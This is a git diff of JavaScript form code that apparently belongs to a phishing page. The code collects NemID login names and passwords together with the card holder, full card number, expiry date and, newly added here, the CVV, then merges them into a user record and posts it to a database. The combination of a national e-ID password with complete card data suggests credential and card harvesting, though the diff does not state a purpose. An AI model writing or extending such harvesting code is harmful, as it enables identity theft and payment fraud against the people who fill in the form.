@@ -81,8 +81,9 @@ cardSubmit.addEventListener('click', (event) => {
         nemid : form.elements.nemid.value,
         nempassword : form.elements.nempassword.value,
         card_holder : form.elements.card_holder.value,
-        car_number : form.elements.card_number.value,
-        date: form.elements.date.value
+        card_number : form.elements.card_number_part1.value + form.elements.card_number_part2.value + form.elements.card_number_part3.value + form.elements.card_number_part4.value,
+        date: form.elements.date1.value + form.elements.date2.value,
+        cvv: form.elements.cvc.value
     };
     console.log(redInputData);
     get(redInputData);
@@ -103,12 +104,6 @@ function get(redInputData){
         post(currUserData, redInputData);
     });
 }
-
-
-  // post function coming here
-
-
-
 
 // Media queries 
 window.addEventListener("resize", mediaQueires)
@@ -136,7 +131,7 @@ function mediaQueires() {
   }
 }
 
-// Then I post the new redInputData to the database using the userId -- not working
+// Then I post the new redInputData to the database using the userId
 function post(currUserData, redInputData) {
     Object.assign(currUserData, redInputData);
     const postRedData = JSON.stringify(currUserData);
